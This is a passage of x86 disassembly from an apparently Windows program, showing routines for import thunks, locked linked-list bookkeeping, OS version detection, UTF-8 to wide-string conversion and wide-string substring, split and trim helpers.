  4052eb:	8b d9                	mov    %ecx,%ebx
  4052ed:	8b c8                	mov    %eax,%ecx
  4052ef:	8b c6                	mov    %esi,%eax
  4052f1:	5e                   	pop    %esi
  4052f2:	c2 10 00             	ret    $0x10
  4052f5:	ff 25 60 64 41 00    	jmp    *0x416460
  4052fb:	ff 25 64 64 41 00    	jmp    *0x416464
  405301:	ff 25 68 64 41 00    	jmp    *0x416468
  405307:	ff 25 6c 64 41 00    	jmp    *0x41646c
  40530d:	ff 25 70 64 41 00    	jmp    *0x416470
  405313:	ff 25 74 64 41 00    	jmp    *0x416474
  405319:	ff 25 78 64 41 00    	jmp    *0x416478
  40531f:	ff 25 7c 64 41 00    	jmp    *0x41647c
  405325:	ff 25 80 64 41 00    	jmp    *0x416480
  40532b:	ff 25 84 64 41 00    	jmp    *0x416484
  405331:	ff 25 88 64 41 00    	jmp    *0x416488
  405337:	ff 25 8c 64 41 00    	jmp    *0x41648c
  40533d:	ff 25 90 64 41 00    	jmp    *0x416490
  405343:	ff 25 94 64 41 00    	jmp    *0x416494
  405349:	ff 25 78 65 41 00    	jmp    *0x416578
  40534f:	ff 25 48 66 41 00    	jmp    *0x416648
  405355:	ff 25 6c 66 41 00    	jmp    *0x41666c
  40535b:	ff 25 70 66 41 00    	jmp    *0x416670
  405361:	ff 25 74 66 41 00    	jmp    *0x416674
  405367:	ff 25 78 66 41 00    	jmp    *0x416678
  40536d:	ff 25 7c 66 41 00    	jmp    *0x41667c
  405373:	57                   	push   %edi
  405374:	bf 80 76 41 00       	mov    $0x417680,%edi
  405379:	57                   	push   %edi
  40537a:	ff 15 f4 64 41 00    	call   *0x4164f4
  405380:	a1 9c 70 41 00       	mov    0x41709c,%eax
  405385:	85 c0                	test   %eax,%eax
  405387:	74 23                	je     0x4053ac
  405389:	56                   	push   %esi
  40538a:	8d 70 08             	lea    0x8(%eax),%esi
  40538d:	ff 36                	push   (%esi)
  40538f:	ff 15 f8 64 41 00    	call   *0x4164f8
  405395:	56                   	push   %esi
  405396:	68 9c 70 41 00       	push   $0x41709c
  40539b:	e8 d2 83 00 00       	call   0x40d772
  4053a0:	a1 9c 70 41 00       	mov    0x41709c,%eax
  4053a5:	59                   	pop    %ecx
  4053a6:	59                   	pop    %ecx
  4053a7:	85 c0                	test   %eax,%eax
  4053a9:	75 df                	jne    0x40538a
  4053ab:	5e                   	pop    %esi
  4053ac:	57                   	push   %edi
  4053ad:	ff 15 fc 64 41 00    	call   *0x4164fc
  4053b3:	5f                   	pop    %edi
  4053b4:	c3                   	ret
  4053b5:	68 80 76 41 00       	push   $0x417680
  4053ba:	ff 15 00 65 41 00    	call   *0x416500
  4053c0:	c3                   	ret
  4053c1:	ff 74 24 04          	push   0x4(%esp)
  4053c5:	e8 1a 00 00 00       	call   0x4053e4
  4053ca:	85 c0                	test   %eax,%eax
  4053cc:	74 11                	je     0x4053df
  4053ce:	6a 00                	push   $0x0
  4053d0:	50                   	push   %eax
  4053d1:	ff 15 04 65 41 00    	call   *0x416504
  4053d7:	f7 d8                	neg    %eax
  4053d9:	1b c0                	sbb    %eax,%eax
  4053db:	f7 d8                	neg    %eax
  4053dd:	eb 02                	jmp    0x4053e1
  4053df:	33 c0                	xor    %eax,%eax
  4053e1:	c2 04 00             	ret    $0x4
  4053e4:	53                   	push   %ebx
  4053e5:	56                   	push   %esi
  4053e6:	57                   	push   %edi
  4053e7:	bb 80 76 41 00       	mov    $0x417680,%ebx
  4053ec:	33 ff                	xor    %edi,%edi
  4053ee:	53                   	push   %ebx
  4053ef:	ff 15 f4 64 41 00    	call   *0x4164f4
  4053f5:	8b 35 9c 70 41 00    	mov    0x41709c,%esi
  4053fb:	85 f6                	test   %esi,%esi
  4053fd:	74 22                	je     0x405421
  4053ff:	8b 44 24 10          	mov    0x10(%esp),%eax
  405403:	39 46 0c             	cmp    %eax,0xc(%esi)
  405406:	74 08                	je     0x405410
  405408:	8b 36                	mov    (%esi),%esi
  40540a:	85 f6                	test   %esi,%esi
  40540c:	75 f5                	jne    0x405403
  40540e:	eb 11                	jmp    0x405421
  405410:	57                   	push   %edi
  405411:	ff 76 08             	push   0x8(%esi)
  405414:	ff 15 04 65 41 00    	call   *0x416504
  40541a:	85 c0                	test   %eax,%eax
  40541c:	74 03                	je     0x405421
  40541e:	8b 7e 08             	mov    0x8(%esi),%edi
  405421:	53                   	push   %ebx
  405422:	ff 15 fc 64 41 00    	call   *0x4164fc
  405428:	8b c7                	mov    %edi,%eax
  40542a:	5f                   	pop    %edi
  40542b:	5e                   	pop    %esi
  40542c:	5b                   	pop    %ebx
  40542d:	c2 04 00             	ret    $0x4
  405430:	53                   	push   %ebx
  405431:	56                   	push   %esi
  405432:	57                   	push   %edi
  405433:	8b 7c 24 10          	mov    0x10(%esp),%edi
  405437:	6a 00                	push   $0x0
  405439:	57                   	push   %edi
  40543a:	e8 a5 ff ff ff       	call   0x4053e4
  40543f:	50                   	push   %eax
  405440:	ff 15 08 65 41 00    	call   *0x416508
  405446:	bb 80 76 41 00       	mov    $0x417680,%ebx
  40544b:	53                   	push   %ebx
  40544c:	ff 15 f4 64 41 00    	call   *0x4164f4
  405452:	8b 35 9c 70 41 00    	mov    0x41709c,%esi
  405458:	eb 07                	jmp    0x405461
  40545a:	39 7e 0c             	cmp    %edi,0xc(%esi)
  40545d:	74 08                	je     0x405467
  40545f:	8b 36                	mov    (%esi),%esi
  405461:	85 f6                	test   %esi,%esi
  405463:	75 f5                	jne    0x40545a
  405465:	eb 18                	jmp    0x40547f
  405467:	83 c6 08             	add    $0x8,%esi
  40546a:	ff 36                	push   (%esi)
  40546c:	ff 15 f8 64 41 00    	call   *0x4164f8
  405472:	56                   	push   %esi
  405473:	68 9c 70 41 00       	push   $0x41709c
  405478:	e8 f5 82 00 00       	call   0x40d772
  40547d:	59                   	pop    %ecx
  40547e:	59                   	pop    %ecx
  40547f:	53                   	push   %ebx
  405480:	ff 15 fc 64 41 00    	call   *0x4164fc
  405486:	5f                   	pop    %edi
  405487:	5e                   	pop    %esi
  405488:	5b                   	pop    %ebx
  405489:	c2 04 00             	ret    $0x4
  40548c:	51                   	push   %ecx
  40548d:	55                   	push   %ebp
  40548e:	56                   	push   %esi
  40548f:	8d 44 24 08          	lea    0x8(%esp),%eax
  405493:	33 f6                	xor    %esi,%esi
  405495:	50                   	push   %eax
  405496:	56                   	push   %esi
  405497:	ff 74 24 1c          	push   0x1c(%esp)
  40549b:	ff 74 24 1c          	push   0x1c(%esp)
  40549f:	68 00 10 00 00       	push   $0x1000
  4054a4:	56                   	push   %esi
  4054a5:	ff 15 0c 65 41 00    	call   *0x41650c
  4054ab:	8b e8                	mov    %eax,%ebp
  4054ad:	85 ed                	test   %ebp,%ebp
  4054af:	74 73                	je     0x405524
  4054b1:	57                   	push   %edi
  4054b2:	68 80 76 41 00       	push   $0x417680
  4054b7:	ff 15 f4 64 41 00    	call   *0x4164f4
  4054bd:	8b 3d 9c 70 41 00    	mov    0x41709c,%edi
  4054c3:	85 ff                	test   %edi,%edi
  4054c5:	74 31                	je     0x4054f8
  4054c7:	53                   	push   %ebx
  4054c8:	56                   	push   %esi
  4054c9:	8d 5f 08             	lea    0x8(%edi),%ebx
  4054cc:	ff 33                	push   (%ebx)
  4054ce:	ff 15 04 65 41 00    	call   *0x416504
  4054d4:	85 c0                	test   %eax,%eax
  4054d6:	75 19                	jne    0x4054f1
  4054d8:	ff 33                	push   (%ebx)
  4054da:	ff 15 f8 64 41 00    	call   *0x4164f8
  4054e0:	8b 3f                	mov    (%edi),%edi
  4054e2:	53                   	push   %ebx
  4054e3:	68 9c 70 41 00       	push   $0x41709c
  4054e8:	e8 85 82 00 00       	call   0x40d772
  4054ed:	59                   	pop    %ecx
  4054ee:	59                   	pop    %ecx
  4054ef:	eb 02                	jmp    0x4054f3
  4054f1:	8b 3f                	mov    (%edi),%edi
  4054f3:	85 ff                	test   %edi,%edi
  4054f5:	75 d1                	jne    0x4054c8
  4054f7:	5b                   	pop    %ebx
  4054f8:	a1 08 61 41 00       	mov    0x416108,%eax
  4054fd:	8b f0                	mov    %eax,%esi
  4054ff:	40                   	inc    %eax
  405500:	6a 10                	push   $0x10
  405502:	68 9c 70 41 00       	push   $0x41709c
  405507:	a3 08 61 41 00       	mov    %eax,0x416108
  40550c:	e8 a1 82 00 00       	call   0x40d7b2
  405511:	59                   	pop    %ecx
  405512:	59                   	pop    %ecx
  405513:	68 80 76 41 00       	push   $0x417680
  405518:	89 28                	mov    %ebp,(%eax)
  40551a:	89 70 04             	mov    %esi,0x4(%eax)
  40551d:	ff 15 fc 64 41 00    	call   *0x4164fc
  405523:	5f                   	pop    %edi
  405524:	8b c6                	mov    %esi,%eax
  405526:	5e                   	pop    %esi
  405527:	5d                   	pop    %ebp
  405528:	59                   	pop    %ecx
  405529:	c2 08 00             	ret    $0x8
  40552c:	83 3d a0 70 41 00 00 	cmpl   $0x0,0x4170a0
  405533:	75 12                	jne    0x405547
  405535:	6a 01                	push   $0x1
  405537:	ff 15 58 66 41 00    	call   *0x416658
  40553d:	c7 05 a0 70 41 00 01 	movl   $0x1,0x4170a0
  405544:	00 00 00 
  405547:	ff 25 10 65 41 00    	jmp    *0x416510
  40554d:	56                   	push   %esi
  40554e:	8b 74 24 08          	mov    0x8(%esp),%esi
  405552:	57                   	push   %edi
  405553:	bf 1c 01 00 00       	mov    $0x11c,%edi
  405558:	57                   	push   %edi
  405559:	6a 00                	push   $0x0
  40555b:	56                   	push   %esi
  40555c:	e8 0f fb ff ff       	call   0x405070
  405561:	83 c4 0c             	add    $0xc,%esp
  405564:	89 3e                	mov    %edi,(%esi)
  405566:	68 00 20 41 00       	push   $0x412000
  40556b:	ff 15 9c 64 41 00    	call   *0x41649c
  405571:	85 c0                	test   %eax,%eax
  405573:	74 1a                	je     0x40558f
  405575:	68 14 20 41 00       	push   $0x412014
  40557a:	50                   	push   %eax
  40557b:	ff 15 14 65 41 00    	call   *0x416514
  405581:	85 c0                	test   %eax,%eax
  405583:	74 0a                	je     0x40558f
  405585:	56                   	push   %esi
  405586:	ff d0                	call   *%eax
  405588:	f7 d8                	neg    %eax
  40558a:	1b c0                	sbb    %eax,%eax
  40558c:	40                   	inc    %eax
  40558d:	eb 02                	jmp    0x405591
  40558f:	33 c0                	xor    %eax,%eax
  405591:	5f                   	pop    %edi
  405592:	5e                   	pop    %esi
  405593:	c3                   	ret
  405594:	81 ec 4c 03 00 00    	sub    $0x34c,%esp
  40559a:	53                   	push   %ebx
  40559b:	55                   	push   %ebp
  40559c:	56                   	push   %esi
  40559d:	57                   	push   %edi
  40559e:	8d 44 24 10          	lea    0x10(%esp),%eax
  4055a2:	c7 44 24 10 14 01 00 	movl   $0x114,0x10(%esp)
  4055a9:	00 
  4055aa:	50                   	push   %eax
  4055ab:	be c8 00 00 00       	mov    $0xc8,%esi
  4055b0:	33 db                	xor    %ebx,%ebx
  4055b2:	33 ff                	xor    %edi,%edi
  4055b4:	ff 15 18 65 41 00    	call   *0x416518
  4055ba:	85 c0                	test   %eax,%eax
  4055bc:	0f 84 2a 01 00 00    	je     0x4056ec
  4055c2:	8b 44 24 20          	mov    0x20(%esp),%eax
  4055c6:	48                   	dec    %eax
  4055c7:	0f 84 02 01 00 00    	je     0x4056cf
  4055cd:	48                   	dec    %eax
  4055ce:	0f 85 18 01 00 00    	jne    0x4056ec
  4055d4:	8d 84 24 24 01 00 00 	lea    0x124(%esp),%eax
  4055db:	33 ed                	xor    %ebp,%ebp
  4055dd:	50                   	push   %eax
  4055de:	e8 6a ff ff ff       	call   0x40554d
  4055e3:	59                   	pop    %ecx
  4055e4:	85 c0                	test   %eax,%eax
  4055e6:	74 18                	je     0x405600
  4055e8:	8b 9c 24 28 01 00 00 	mov    0x128(%esp),%ebx
  4055ef:	8b bc 24 2c 01 00 00 	mov    0x12c(%esp),%edi
  4055f6:	80 bc 24 3e 02 00 00 	cmpb   $0x1,0x23e(%esp)
  4055fd:	01 
  4055fe:	eb 2d                	jmp    0x40562d
  405600:	8d 84 24 40 02 00 00 	lea    0x240(%esp),%eax
  405607:	c7 84 24 40 02 00 00 	movl   $0x11c,0x240(%esp)
  40560e:	1c 01 00 00 
  405612:	50                   	push   %eax
  405613:	ff 15 18 65 41 00    	call   *0x416518
  405619:	85 c0                	test   %eax,%eax
  40561b:	74 15                	je     0x405632
  40561d:	8b 5c 24 14          	mov    0x14(%esp),%ebx
  405621:	8b 7c 24 18          	mov    0x18(%esp),%edi
  405625:	80 bc 24 5a 03 00 00 	cmpb   $0x1,0x35a(%esp)
  40562c:	01 
  40562d:	75 03                	jne    0x405632
  40562f:	33 ed                	xor    %ebp,%ebp
  405631:	45                   	inc    %ebp
  405632:	83 eb 03             	sub    $0x3,%ebx
  405635:	0f 84 90 00 00 00    	je     0x4056cb
  40563b:	4b                   	dec    %ebx
  40563c:	0f 84 85 00 00 00    	je     0x4056c7
  405642:	4b                   	dec    %ebx
  405643:	74 61                	je     0x4056a6
  405645:	4b                   	dec    %ebx
  405646:	74 18                	je     0x405660
  405648:	83 eb 04             	sub    $0x4,%ebx
  40564b:	0f 85 9b 00 00 00    	jne    0x4056ec
  405651:	85 ff                	test   %edi,%edi
  405653:	0f 85 93 00 00 00    	jne    0x4056ec
  405659:	6a 6e                	push   $0x6e
  40565b:	e9 8b 00 00 00       	jmp    0x4056eb
  405660:	83 ef 00             	sub    $0x0,%edi
  405663:	74 33                	je     0x405698
  405665:	4f                   	dec    %edi
  405666:	74 22                	je     0x40568a
  405668:	4f                   	dec    %edi
  405669:	74 11                	je     0x40567c
  40566b:	4f                   	dec    %edi
  40566c:	75 7e                	jne    0x4056ec
  40566e:	8b f5                	mov    %ebp,%esi
  405670:	f7 de                	neg    %esi
  405672:	1b f6                	sbb    %esi,%esi
  405674:	83 e6 fb             	and    $0xfffffffb,%esi
  405677:	83 c6 69             	add    $0x69,%esi
  40567a:	eb 70                	jmp    0x4056ec
  40567c:	8b f5                	mov    %ebp,%esi
  40567e:	f7 de                	neg    %esi
  405680:	1b f6                	sbb    %esi,%esi
  405682:	83 e6 fb             	and    $0xfffffffb,%esi
  405685:	83 c6 5f             	add    $0x5f,%esi
  405688:	eb 62                	jmp    0x4056ec
  40568a:	8b f5                	mov    %ebp,%esi
  40568c:	f7 de                	neg    %esi
  40568e:	1b f6                	sbb    %esi,%esi
  405690:	83 e6 fb             	and    $0xfffffffb,%esi
  405693:	83 c6 55             	add    $0x55,%esi
  405696:	eb 54                	jmp    0x4056ec
  405698:	8b f5                	mov    %ebp,%esi
  40569a:	f7 de                	neg    %esi
  40569c:	1b f6                	sbb    %esi,%esi
  40569e:	83 e6 fb             	and    $0xfffffffb,%esi
  4056a1:	83 c6 4b             	add    $0x4b,%esi
  4056a4:	eb 46                	jmp    0x4056ec
  4056a6:	83 ef 00             	sub    $0x0,%edi
  4056a9:	74 18                	je     0x4056c3
  4056ab:	4f                   	dec    %edi
  4056ac:	74 11                	je     0x4056bf
  4056ae:	4f                   	dec    %edi
  4056af:	75 3b                	jne    0x4056ec
  4056b1:	8b f5                	mov    %ebp,%esi
  4056b3:	f7 de                	neg    %esi
  4056b5:	1b f6                	sbb    %esi,%esi
  4056b7:	83 e6 fb             	and    $0xfffffffb,%esi
  4056ba:	83 c6 41             	add    $0x41,%esi
  4056bd:	eb 2d                	jmp    0x4056ec
  4056bf:	6a 3c                	push   $0x3c
  4056c1:	eb 28                	jmp    0x4056eb
  4056c3:	6a 32                	push   $0x32
  4056c5:	eb 24                	jmp    0x4056eb
  4056c7:	6a 14                	push   $0x14
  4056c9:	eb 20                	jmp    0x4056eb
  4056cb:	6a 05                	push   $0x5
  4056cd:	eb 1c                	jmp    0x4056eb
  4056cf:	8b 44 24 18          	mov    0x18(%esp),%eax
  4056d3:	85 c0                	test   %eax,%eax
  4056d5:	74 12                	je     0x4056e9
  4056d7:	83 f8 0a             	cmp    $0xa,%eax
  4056da:	74 09                	je     0x4056e5
  4056dc:	83 f8 5a             	cmp    $0x5a,%eax
  4056df:	75 0b                	jne    0x4056ec
  4056e1:	6a 28                	push   $0x28
  4056e3:	eb 06                	jmp    0x4056eb
  4056e5:	6a 1e                	push   $0x1e
  4056e7:	eb 02                	jmp    0x4056eb
  4056e9:	6a 0a                	push   $0xa
  4056eb:	5e                   	pop    %esi
  4056ec:	5f                   	pop    %edi
  4056ed:	8b c6                	mov    %esi,%eax
  4056ef:	5e                   	pop    %esi
  4056f0:	5d                   	pop    %ebp
  4056f1:	5b                   	pop    %ebx
  4056f2:	81 c4 4c 03 00 00    	add    $0x34c,%esp
  4056f8:	c3                   	ret
  4056f9:	cc                   	int3
  4056fa:	cc                   	int3
  4056fb:	cc                   	int3
  4056fc:	cc                   	int3
  4056fd:	cc                   	int3
  4056fe:	cc                   	int3
  4056ff:	cc                   	int3
  405700:	55                   	push   %ebp
  405701:	56                   	push   %esi
  405702:	8b 74 24 0c          	mov    0xc(%esp),%esi
  405706:	57                   	push   %edi
  405707:	85 f6                	test   %esi,%esi
  405709:	75 05                	jne    0x405710
  40570b:	be 24 20 41 00       	mov    $0x412024,%esi
  405710:	6a 00                	push   $0x0
  405712:	6a 00                	push   $0x0
  405714:	6a 00                	push   $0x0
  405716:	6a 00                	push   $0x0
  405718:	6a ff                	push   $0xffffffff
  40571a:	56                   	push   %esi
  40571b:	6a 00                	push   $0x0
  40571d:	68 e9 fd 00 00       	push   $0xfde9
  405722:	ff 15 1c 65 41 00    	call   *0x41651c
  405728:	8b e8                	mov    %eax,%ebp
  40572a:	55                   	push   %ebp
  40572b:	e8 b0 40 00 00       	call   0x4097e0
  405730:	8b f8                	mov    %eax,%edi
  405732:	85 ff                	test   %edi,%edi
  405734:	74 16                	je     0x40574c
  405736:	6a 00                	push   $0x0
  405738:	6a 00                	push   $0x0
  40573a:	55                   	push   %ebp
  40573b:	57                   	push   %edi
  40573c:	6a ff                	push   $0xffffffff
  40573e:	56                   	push   %esi
  40573f:	6a 00                	push   $0x0
  405741:	68 e9 fd 00 00       	push   $0xfde9
  405746:	ff 15 1c 65 41 00    	call   *0x41651c
  40574c:	8b c7                	mov    %edi,%eax
  40574e:	5f                   	pop    %edi
  40574f:	5e                   	pop    %esi
  405750:	5d                   	pop    %ebp
  405751:	c2 04 00             	ret    $0x4
  405754:	cc                   	int3
  405755:	cc                   	int3
  405756:	cc                   	int3
  405757:	cc                   	int3
  405758:	cc                   	int3
  405759:	cc                   	int3
  40575a:	cc                   	int3
  40575b:	cc                   	int3
  40575c:	cc                   	int3
  40575d:	cc                   	int3
  40575e:	cc                   	int3
  40575f:	cc                   	int3
  405760:	8b 44 24 04          	mov    0x4(%esp),%eax
  405764:	57                   	push   %edi
  405765:	33 ff                	xor    %edi,%edi
  405767:	85 c0                	test   %eax,%eax
  405769:	74 78                	je     0x4057e3
  40576b:	8b 54 24 0c          	mov    0xc(%esp),%edx
  40576f:	85 d2                	test   %edx,%edx
  405771:	74 70                	je     0x4057e3
  405773:	55                   	push   %ebp
  405774:	0f b7 2a             	movzwl (%edx),%ebp
  405777:	66 85 ed             	test   %bp,%bp
  40577a:	74 60                	je     0x4057dc
  40577c:	0f b7 08             	movzwl (%eax),%ecx
  40577f:	66 85 c9             	test   %cx,%cx
  405782:	74 58                	je     0x4057dc
  405784:	53                   	push   %ebx
  405785:	56                   	push   %esi
  405786:	83 c0 02             	add    $0x2,%eax
  405789:	66 3b cd             	cmp    %bp,%cx
  40578c:	75 3d                	jne    0x4057cb
  40578e:	8d 4a 02             	lea    0x2(%edx),%ecx
  405791:	8b d8                	mov    %eax,%ebx
  405793:	0f b7 10             	movzwl (%eax),%edx
  405796:	66 85 d2             	test   %dx,%dx
  405799:	74 21                	je     0x4057bc
  40579b:	eb 03                	jmp    0x4057a0
  40579d:	8d 49 00             	lea    0x0(%ecx),%ecx
  4057a0:	0f b7 31             	movzwl (%ecx),%esi
  4057a3:	66 85 f6             	test   %si,%si
  4057a6:	74 1a                	je     0x4057c2
  4057a8:	66 3b d6             	cmp    %si,%dx
  4057ab:	75 0f                	jne    0x4057bc
  4057ad:	0f b7 50 02          	movzwl 0x2(%eax),%edx
  4057b1:	83 c0 02             	add    $0x2,%eax
  4057b4:	83 c1 02             	add    $0x2,%ecx
  4057b7:	66 85 d2             	test   %dx,%dx
  4057ba:	75 e4                	jne    0x4057a0
  4057bc:	66 83 39 00          	cmpw   $0x0,(%ecx)
  4057c0:	75 03                	jne    0x4057c5
  4057c2:	47                   	inc    %edi
  4057c3:	eb 02                	jmp    0x4057c7
  4057c5:	8b c3                	mov    %ebx,%eax
  4057c7:	8b 54 24 18          	mov    0x18(%esp),%edx
  4057cb:	0f b7 08             	movzwl (%eax),%ecx
  4057ce:	66 85 c9             	test   %cx,%cx
  4057d1:	75 b3                	jne    0x405786
  4057d3:	5e                   	pop    %esi
  4057d4:	5b                   	pop    %ebx
  4057d5:	5d                   	pop    %ebp
  4057d6:	8b c7                	mov    %edi,%eax
  4057d8:	5f                   	pop    %edi
  4057d9:	c2 08 00             	ret    $0x8
  4057dc:	5d                   	pop    %ebp
  4057dd:	8b c7                	mov    %edi,%eax
  4057df:	5f                   	pop    %edi
  4057e0:	c2 08 00             	ret    $0x8
  4057e3:	8b c7                	mov    %edi,%eax
  4057e5:	5f                   	pop    %edi
  4057e6:	c2 08 00             	ret    $0x8
  4057e9:	cc                   	int3
  4057ea:	cc                   	int3
  4057eb:	cc                   	int3
  4057ec:	cc                   	int3
  4057ed:	cc                   	int3
  4057ee:	cc                   	int3
  4057ef:	cc                   	int3
  4057f0:	51                   	push   %ecx
  4057f1:	8b 54 24 0c          	mov    0xc(%esp),%edx
  4057f5:	55                   	push   %ebp
  4057f6:	33 ed                	xor    %ebp,%ebp
  4057f8:	83 fa 01             	cmp    $0x1,%edx
  4057fb:	0f 8c 0e 01 00 00    	jl     0x40590f
  405801:	53                   	push   %ebx
  405802:	56                   	push   %esi
  405803:	8b 74 24 14          	mov    0x14(%esp),%esi
  405807:	57                   	push   %edi
  405808:	85 f6                	test   %esi,%esi
  40580a:	75 05                	jne    0x405811
  40580c:	be 24 20 41 00       	mov    $0x412024,%esi
  405811:	8b 4c 24 20          	mov    0x20(%esp),%ecx
  405815:	85 c9                	test   %ecx,%ecx
  405817:	75 09                	jne    0x405822
  405819:	b9 24 20 41 00       	mov    $0x412024,%ecx
  40581e:	89 4c 24 20          	mov    %ecx,0x20(%esp)
  405822:	0f b7 01             	movzwl (%ecx),%eax
  405825:	33 ff                	xor    %edi,%edi
  405827:	89 44 24 10          	mov    %eax,0x10(%esp)
  40582b:	8b de                	mov    %esi,%ebx
  40582d:	89 5c 24 18          	mov    %ebx,0x18(%esp)
  405831:	66 85 c0             	test   %ax,%ax
  405834:	74 5c                	je     0x405892
  405836:	66 39 79 02          	cmp    %di,0x2(%ecx)
  40583a:	74 56                	je     0x405892
  40583c:	8b d9                	mov    %ecx,%ebx
  40583e:	8d 53 02             	lea    0x2(%ebx),%edx
  405841:	66 8b 03             	mov    (%ebx),%ax
  405844:	83 c3 02             	add    $0x2,%ebx
  405847:	66 85 c0             	test   %ax,%ax
  40584a:	75 f5                	jne    0x405841
  40584c:	2b da                	sub    %edx,%ebx
  40584e:	d1 fb                	sar    $1,%ebx
  405850:	53                   	push   %ebx
  405851:	51                   	push   %ecx
  405852:	56                   	push   %esi
  405853:	e8 9d fa ff ff       	call   0x4052f5
  405858:	83 c4 0c             	add    $0xc,%esp
  40585b:	85 c0                	test   %eax,%eax
  40585d:	74 0e                	je     0x40586d
  40585f:	66 39 2e             	cmp    %bp,(%esi)
  405862:	74 09                	je     0x40586d
  405864:	8b 4c 24 20          	mov    0x20(%esp),%ecx
  405868:	83 c6 02             	add    $0x2,%esi
  40586b:	eb e3                	jmp    0x405850
  40586d:	47                   	inc    %edi
  40586e:	3b 7c 24 1c          	cmp    0x1c(%esp),%edi
  405872:	74 12                	je     0x405886
  405874:	66 39 2e             	cmp    %bp,(%esi)
  405877:	74 44                	je     0x4058bd
  405879:	8b 4c 24 20          	mov    0x20(%esp),%ecx
  40587d:	8d 34 5e             	lea    (%esi,%ebx,2),%esi
  405880:	89 74 24 18          	mov    %esi,0x18(%esp)
  405884:	eb ca                	jmp    0x405850
  405886:	8b 5c 24 18          	mov    0x18(%esp),%ebx
  40588a:	8b ee                	mov    %esi,%ebp
  40588c:	2b eb                	sub    %ebx,%ebp
  40588e:	d1 fd                	sar    $1,%ebp
  405890:	eb 2f                	jmp    0x4058c1
  405892:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  405896:	0f b7 06             	movzwl (%esi),%eax
  405899:	66 3b c1             	cmp    %cx,%ax
  40589c:	74 05                	je     0x4058a3
  40589e:	66 85 c0             	test   %ax,%ax
  4058a1:	75 0d                	jne    0x4058b0
  4058a3:	47                   	inc    %edi
  4058a4:	3b fa                	cmp    %edx,%edi
  4058a6:	74 0d                	je     0x4058b5
  4058a8:	66 85 c0             	test   %ax,%ax
  4058ab:	74 14                	je     0x4058c1
  4058ad:	8d 5e 02             	lea    0x2(%esi),%ebx
  4058b0:	83 c6 02             	add    $0x2,%esi
  4058b3:	eb e1                	jmp    0x405896
  4058b5:	8b ee                	mov    %esi,%ebp
  4058b7:	2b eb                	sub    %ebx,%ebp
  4058b9:	d1 fd                	sar    $1,%ebp
  4058bb:	eb 04                	jmp    0x4058c1
  4058bd:	8b 5c 24 18          	mov    0x18(%esp),%ebx
  4058c1:	56                   	push   %esi
  4058c2:	e8 59 85 00 00       	call   0x40de20
  4058c7:	8b 74 24 24          	mov    0x24(%esp),%esi
  4058cb:	8b f8                	mov    %eax,%edi
  4058cd:	85 ff                	test   %edi,%edi
  4058cf:	74 18                	je     0x4058e9
  4058d1:	56                   	push   %esi
  4058d2:	e8 99 85 00 00       	call   0x40de70
  4058d7:	8d 0c 6d 00 00 00 00 	lea    0x0(,%ebp,2),%ecx
  4058de:	51                   	push   %ecx
  4058df:	53                   	push   %ebx
  4058e0:	50                   	push   %eax
  4058e1:	e8 15 fa ff ff       	call   0x4052fb
  4058e6:	83 c4 0c             	add    $0xc,%esp
  4058e9:	56                   	push   %esi
  4058ea:	55                   	push   %ebp
  4058eb:	e8 b0 85 00 00       	call   0x40dea0
  4058f0:	8b f0                	mov    %eax,%esi
  4058f2:	85 ff                	test   %edi,%edi
  4058f4:	75 0b                	jne    0x405901
  4058f6:	55                   	push   %ebp
  4058f7:	53                   	push   %ebx
  4058f8:	56                   	push   %esi
  4058f9:	e8 03 fa ff ff       	call   0x405301
  4058fe:	83 c4 0c             	add    $0xc,%esp
  405901:	5f                   	pop    %edi
  405902:	33 c0                	xor    %eax,%eax
  405904:	66 89 04 6e          	mov    %ax,(%esi,%ebp,2)
  405908:	5e                   	pop    %esi
  405909:	5b                   	pop    %ebx
  40590a:	5d                   	pop    %ebp
  40590b:	59                   	pop    %ecx
  40590c:	c2 10 00             	ret    $0x10
  40590f:	ff 74 24 18          	push   0x18(%esp)
  405913:	e8 28 86 00 00       	call   0x40df40
  405918:	5d                   	pop    %ebp
  405919:	59                   	pop    %ecx
  40591a:	c2 10 00             	ret    $0x10
  40591d:	cc                   	int3
  40591e:	cc                   	int3
  40591f:	cc                   	int3
  405920:	56                   	push   %esi
  405921:	8b 74 24 08          	mov    0x8(%esp),%esi
  405925:	ba 01 00 00 00       	mov    $0x1,%edx
  40592a:	8b c6                	mov    %esi,%eax
  40592c:	85 f6                	test   %esi,%esi
  40592e:	74 46                	je     0x405976
  405930:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  405934:	85 c9                	test   %ecx,%ecx
  405936:	74 3e                	je     0x405976
  405938:	66 83 3e 00          	cmpw   $0x0,(%esi)
  40593c:	74 38                	je     0x405976
  40593e:	66 83 39 00          	cmpw   $0x0,(%ecx)
  405942:	74 32                	je     0x405976
  405944:	83 c0 02             	add    $0x2,%eax
  405947:	66 83 38 00          	cmpw   $0x0,(%eax)
  40594b:	75 f7                	jne    0x405944
  40594d:	2b c6                	sub    %esi,%eax
  40594f:	d1 f8                	sar    $1,%eax
  405951:	83 f8 01             	cmp    $0x1,%eax
  405954:	7d 03                	jge    0x405959
  405956:	8d 50 01             	lea    0x1(%eax),%edx
  405959:	8d 46 fe             	lea    -0x2(%esi),%eax
  40595c:	8d 04 50             	lea    (%eax,%edx,2),%eax
  40595f:	51                   	push   %ecx
  405960:	50                   	push   %eax
  405961:	e8 a1 f9 ff ff       	call   0x405307
  405966:	83 c4 08             	add    $0x8,%esp
  405969:	85 c0                	test   %eax,%eax
  40596b:	74 09                	je     0x405976
  40596d:	2b c6                	sub    %esi,%eax
  40596f:	d1 f8                	sar    $1,%eax
  405971:	40                   	inc    %eax
  405972:	5e                   	pop    %esi
  405973:	c2 08 00             	ret    $0x8
  405976:	33 c0                	xor    %eax,%eax
  405978:	5e                   	pop    %esi
  405979:	c2 08 00             	ret    $0x8
  40597c:	cc                   	int3
  40597d:	cc                   	int3
  40597e:	cc                   	int3
  40597f:	cc                   	int3
  405980:	56                   	push   %esi
  405981:	57                   	push   %edi
  405982:	8b 7c 24 0c          	mov    0xc(%esp),%edi
  405986:	33 c9                	xor    %ecx,%ecx
  405988:	33 f6                	xor    %esi,%esi
  40598a:	85 ff                	test   %edi,%edi
  40598c:	0f 84 23 01 00 00    	je     0x405ab5
  405992:	0f b7 07             	movzwl (%edi),%eax
  405995:	83 f8 20             	cmp    $0x20,%eax
  405998:	74 05                	je     0x40599f
  40599a:	83 f8 09             	cmp    $0x9,%eax
  40599d:	75 05                	jne    0x4059a4
  40599f:	83 c7 02             	add    $0x2,%edi
  4059a2:	eb ee                	jmp    0x405992
  4059a4:	0f b7 07             	movzwl (%edi),%eax
